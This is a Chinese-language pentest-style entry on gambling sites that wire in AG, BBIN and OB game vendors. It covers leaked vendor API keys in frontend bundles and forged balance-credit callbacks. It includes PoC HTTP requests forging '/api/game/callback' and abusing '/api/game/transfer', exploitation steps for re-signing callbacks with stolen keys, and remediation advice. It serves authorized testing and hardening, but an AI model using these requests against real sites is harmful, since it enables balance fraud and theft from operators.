---
title: 三方游戏 / 视讯接口 key 泄露与回调伪造
cve: 无（实现缺陷）
severity: critical
cvss: 8.8
product: 接入 AG / BBIN / OB 等供应商的包网站
versions: 任意
ports: 80, 443
keywords: game vendor, api key, 视讯, 上分, callback, transfer
entry: 前端拿 vendor key，伪造 /api/game/callback 上分
verified: false
sources: 公开资料整理（实现缺陷类，无 CVE；各家字段/算法以对接文档为准）
---

## 指纹

```
/api/game/balance?platform=AG     /api/game/transfer
/api/game/callback                /api/game/launch?platform=BBIN
前端 /config.js /env.js /static/js/*.map 里出现 agent、secret、apiKey、vendorId
```

## 前置条件

- 授权账号；能读前端资源（多数站点把供应商参数打进 H5 包）。
- 回调签名形态各家不同，**以对接文档为准**，常见三种（别把某家的字段硬套到另一家）：

```
AG 系    : params=<a=b&c=d>&key=<secret>       → sign = MD5(params+key) 或 HMAC-SHA256
BBIN 系  : 表单字段 + key                       → sign = MD5(排序后拼接 + key)
OB / 自研: JSON body + header X-Sign            → HMAC(body, secret)
通用旁证 : 回调里同时出现 account / amount / orderNo / sign / key
排序/编码 : 多数供应商要求参数按 key 升序、URL 编码一次、签名小写、timestamp 5-10 分钟窗口（以对接文档为准）
```

## PoC

```http
### 1) 无鉴权转账/上分（把自己额度转进游戏或反向）
POST /api/game/transfer HTTP/1.1
Authorization: Bearer <token>
Content-Type: application/json

{"platform":"AG","amount":100,"direction":"in"}

### 2) 伪造供应商回调给自己上分（负控先行：先看 sign 错会不会被拒）
POST /api/game/callback HTTP/1.1
Content-Type: application/x-www-form-urlencoded

account=<自己的账号>&amount=1000&orderNo=TEST123&sign=whatever
#  预期：200/成功 ⇒ 无验签；401/403 ⇒ 有验签，改用泄露的 key 正确签名后再打
```

## 利用步骤

1. 从前端 bundle / sourcemap 提取 `vendor key`、`agent`、`apiUrl`（这一步往往直接得手）。
2. **负控先行**：把 `sign` 改错一位 —— 若被拒（签名无效），说明有验签，改用泄露的 key 正确签名；若照收，直接记"无验签"。
3. 验签存在时还要看**来源 IP**：回调是否只接受供应商出口段（在授权范围内用自己服务器试，看是否被拒）。
4. `transfer` 看是否有服务端签名/额度校验；无校验即可双向搬额度。
5. 组合：`callback` 上分 → 下注 → `withdraw-approval-idor.md` 验资金影响面；量化借 `payment-notify-forgery.md` 的"状态变化 + 余额变化同时成立"与"上限 = 单笔 × 可重放次数"。
6. 证据：请求 + 余额前后；只用自己的账号；测试单作废。

## 修复与缓解（加固）

- vendor key/secret 只存服务端，绝不进前端包；H5 只拿临时 token。
- 回调强制验签（按供应商文档）+ 来源 IP 白名单 + 幂等（orderNo 唯一）。
- 转账接口双向鉴权（会员 token + 服务端签名）。

## 参考

- 供应商回调验签文档（AG/BBIN/OB 通用范式）；OWASP A04。
